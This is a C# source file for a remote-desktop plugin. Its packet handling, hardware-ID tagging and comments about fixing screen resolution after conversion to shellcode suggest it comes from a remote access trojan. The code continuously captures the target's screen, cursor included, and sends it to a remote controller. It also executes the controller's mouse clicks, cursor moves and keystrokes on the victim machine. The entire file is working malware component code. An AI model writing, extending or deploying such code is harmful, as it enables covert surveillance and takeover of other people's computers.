﻿using MessagePackLib.MessagePack;
using Plugin.StreamLibrary;
using Plugin.StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        /*
        * 修复转为shellcode时屏幕监控分辨率问题
        * 增加GetDeviceCaps、GetDC、ReleaseDC的原生API
        */

        [DllImport("gdi32.dll")]
        public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        [DllImport("User32.dll", EntryPoint = "ReleaseDC")]
        public extern static int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("User32.dll", EntryPoint = "GetDC")]
        public extern static IntPtr GetDC(IntPtr hWnd);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string lpFileName);

        public static bool IsOk { get; set; }
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
            {
                case "remoteDesktop":
                    {
                        switch (unpack_msgpack.ForcePathObject("Option").AsString)
                        {
                            case "capture":
                                {
                                    if (IsOk == true) return;
                                    IsOk = true;
                                    CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
                                    break;
                                }

                            case "mouseClick":
                                {
                                    mouse_event((Int32)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
                                    break;
                                }

                            case "mouseMove":
                                {
                                    SetCursorPos(Convert.ToInt32(unpack_msgpack.ForcePathObject("X").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Y").AsInteger));
                                    break;
                                }

                            case "stop":
                                {
                                    IsOk = false;
                                    break;
                                }

                            case "keyboardClick":
                                {
                                    bool keyDown = Convert.ToBoolean(unpack_msgpack.ForcePathObject("keyIsDown").AsString);
                                    byte key = Convert.ToByte(unpack_msgpack.ForcePathObject("key").AsInteger);
                                    keybd_event(key, 0, keyDown ? (uint)0x0000 : (uint)0x0002, UIntPtr.Zero);
                                    break;
                                }
                        }
                        break;
                    }
            }
        }

        /*
         * 修复远程桌面分辨率问题
         * 增加相关常量
         */

        private const int DESKTOPVERTRES = 117;
        private const int DESKTOPHORZRES = 118;
        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;



        private const int SRCCOPY = 0x00CC0020;

        /*
         * 修复转为shellcode时屏幕监控分辨率问题
         * 增加GetResolving函数，用于获取屏幕分辨率
         */

        private static void GetResolving(ref int width, ref int height)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            width = GetDeviceCaps(hdc, DESKTOPHORZRES);
            height = GetDeviceCaps(hdc, DESKTOPVERTRES);
            ReleaseDC(IntPtr.Zero, hdc);
        }


        public static void CaptureAndSend(int quality, int Scrn)
        {
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Rectangle rect;
            Size size;
            MsgPack msgpack;
            IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
            MemoryStream stream;
            Thread.Sleep(1);
            while (IsOk && Connection.IsConnected)
            {
                try
                {
                    bmp = GetScreen(Scrn);
                    rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    size = new Size(bmp.Width, bmp.Height);
                    bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (stream = new MemoryStream())
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height), new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                            new Thread(() => { Connection.Send(msgpack.Encode2Bytes()); }).Start();
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
                catch
                {
                    Connection.Disconnected();
                    break;
                }
            }
            try
            {
                IsOk = false;
                bmp?.UnlockBits(bmpData);
                bmp?.Dispose();
                GC.Collect();
            }
            catch { }
        }

        private static Bitmap GetScreen(int Scrn)
        {
            Rectangle rect = Screen.AllScreens[Scrn].Bounds;

           /*
           * 修复转为shellcode时屏幕监控分辨率问题
           * 获取修复的屏幕分辨率并替换
           */

            int width = 0;
            int height = 0;
            GetResolving(ref width, ref height);
            rect.Width = width;
            rect.Height = height;

            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                using (Graphics graphics = Graphics.FromImage(bmpScreenshot))
                {
                    graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                    CURSORINFO pci;
                    pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));
                    if (GetCursorInfo(out pci))
                    {
                        if (pci.flags == CURSOR_SHOWING)
                        {
                            DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                            graphics.ReleaseHdc();
                        }
                    }
                    return bmpScreenshot;
                }
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }

        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

        [DllImport("user32.dll")]
        internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        internal static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
        const Int32 CURSOR_SHOWING = 0x00000001;

    }
}
